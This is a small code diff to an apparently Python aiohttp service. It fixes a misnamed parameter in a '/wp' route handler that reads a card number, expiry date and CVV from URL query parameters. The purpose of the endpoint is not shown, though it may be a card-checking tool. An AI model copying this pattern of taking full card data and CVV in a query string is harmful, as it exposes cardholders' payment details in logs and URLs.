@@ -141,7 +141,7 @@ async def git_webhook(r):
 
 
 @routes.get("/wp")
-async def wordlpey_(e):
+async def wordlpey_(r):
     d = r.rel_url.query
     try:
         cc, mo, yr, cvv = d["cc"], d["month"], d["year"], d["cvv"]
